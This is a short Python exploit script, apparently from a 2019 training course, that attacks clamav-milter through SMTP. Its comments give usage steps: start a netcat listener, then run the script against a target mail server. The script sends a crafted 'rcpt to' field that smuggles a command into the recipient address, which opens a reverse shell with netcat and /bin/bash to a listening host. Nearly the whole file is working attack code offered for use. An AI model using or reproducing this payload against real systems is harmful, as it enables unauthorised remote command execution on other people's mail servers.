##!/usr/bin/python
# This doesnt work out of the box - CSTM 2019 IRM Paul Richards- clamav-milter exploit
# Change this file to include your ip address instead of x.x.x.x
# Run this in a terminal nc -lvp 9000
# Run this in another terminal python ./clamav-milter.py 10.0.0.2 --port 25
# Check to see if you have shell in your nc session

import socket
import argparse

def StatusUpdate(message):
	string = message
	print(string)

def Output():
	string = s.recv(1024)
	print(string)

parser = argparse.ArgumentParser()
parser.add_argument("host", help="the host you want to exploit")
parser.add_argument("--port", help="port you want to target", type=int, default=25)

args = parser.parse_args()
StatusUpdate("Exploiting " + args.host + ":" + str(args.port))
s = socket.socket()
StatusUpdate("Connecting")
s.connect((args.host, 25))
StatusUpdate("Connected")
StatusUpdate("Receiving banner")
Output()

StatusUpdate("Sending ehlo you")
s.send("ehlo you\r\n")
Output()

StatusUpdate("Sending mail from")
s.send("mail from: <>\r\n")
Output()

StatusUpdate("Sending exploit")

payload = "rcpt to: <nobody+\"|nc 10.0.0.201 9000 -e /bin/bash &\">\r\n"


s.send(payload)
Output()

StatusUpdate("Sending data")
s.send("data\r\n")
Output()

StatusUpdate("Sending .")
s.send(".\r\n")
Output()

StatusUpdate("Sending quit")
s.send("quit\r\n")
Output()

s.close()
